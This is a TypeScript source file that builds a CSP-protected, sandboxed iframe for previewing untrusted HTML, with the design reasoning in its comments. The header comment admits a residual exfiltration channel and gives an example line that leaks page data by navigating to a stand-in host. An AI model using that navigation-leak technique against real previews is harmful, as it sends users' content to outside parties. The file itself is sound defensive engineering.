/**
 * Builds the `srcdoc` for the sandboxed HTML preview iframe.
 *
 * The iframe runs with `sandbox="allow-scripts"` only (opaque origin), so the
 * document can never reach the app's storage, cookies, or same-origin `/api`.
 * The injected CSP blocks subresource loads and fetch/XHR/WebSocket unless the
 * user opts into remote resources. It is NOT an exfiltration barrier: CSP has
 * no navigate-to, so script can still leak the page's own content by
 * navigating the frame (`location = 'https://x/?d=…'`), and remote mode adds
 * image URLs as a channel. See docs/adr/html-preview-sandbox.md.
 */

const LOCAL_ONLY_CSP = [
  "default-src 'none'",
  // eval is no more dangerous than inline script inside an opaque origin,
  // and frameworks loaded inline (Alpine, Vue templates) need it.
  "script-src 'unsafe-inline' 'unsafe-eval'",
  "style-src 'unsafe-inline'",
  'img-src data: blob:',
  'font-src data:',
  'media-src data: blob:',
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
];

const REMOTE_CSP = [
  "default-src 'none'",
  "script-src 'unsafe-inline' 'unsafe-eval' https:",
  "style-src 'unsafe-inline' https:",
  'img-src data: blob: https:',
  'font-src data: https:',
  'media-src data: blob: https:',
  // Still closed: remote mode is for CDN assets, not for scripts phoning home.
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
];

export function sandboxCsp(allowRemote: boolean): string {
  return (allowRemote ? REMOTE_CSP : LOCAL_ONLY_CSP).join('; ');
}

/**
 * Chrome refuses to navigate a sandboxed `about:srcdoc` frame, so in-page
 * anchors (a report's table of contents) do nothing even though they never
 * leave the document. This handler scrolls to the target instead. It runs in
 * the same opaque origin as the page, so it gains nothing the page lacks.
 */
const FRAGMENT_LINK_SCRIPT = `document.addEventListener('click', function (e) {
  var link = e.target instanceof Element && e.target.closest('a[href^="#"], area[href^="#"]');
  if (!link) return;
  e.preventDefault();
  var id = link.getAttribute('href').slice(1);
  try { id = decodeURIComponent(id); } catch (_) {}
  var el = id ? document.getElementById(id) || document.getElementsByName(id)[0] : document.documentElement;
  if (el) el.scrollIntoView();
});`;

/**
 * Re-serializes `html` with our CSP `<meta>` as the first `<head>` child (a
 * `<meta>` CSP only covers what follows it), followed by the fragment-link
 * handler. Parsing also lets us remove refresh metas and retarget links.
 * DOMParser documents are inert (no script runs, nothing loads), so parsing
 * untrusted HTML here is safe.
 *
 * The output always starts with `<!DOCTYPE html>`. Legacy doctypes do not
 * need preserving: srcdoc documents are never in quirks mode, whatever their
 * doctype.
 */
export function buildSandboxedSrcDoc(
  html: string,
  { allowRemote }: { allowRemote: boolean }
): string {
  const doc = new DOMParser().parseFromString(html, 'text/html');

  // A refresh meta would navigate the frame away, outside our CSP.
  doc.querySelectorAll('meta[http-equiv]').forEach((m) => {
    if (m.getAttribute('http-equiv')?.toLowerCase() === 'refresh') m.remove();
  });

  const csp = doc.createElement('meta');
  csp.setAttribute('http-equiv', 'Content-Security-Policy');
  csp.setAttribute('content', sandboxCsp(allowRemote));
  const fragmentLinks = doc.createElement('script');
  fragmentLinks.textContent = FRAGMENT_LINK_SCRIPT;
  doc.head.prepend(csp, fragmentLinks);

  // Off-page links become popups, which the sandbox blocks, instead of
  // navigating the frame. A `<base target>` is not used: it cannot exempt the
  // in-page anchors.
  doc.querySelectorAll('a[href], area[href]').forEach((link) => {
    if (!link.getAttribute('href')!.trim().startsWith('#')) link.setAttribute('target', '_blank');
  });

  return '<!DOCTYPE html>' + doc.documentElement.outerHTML;
}
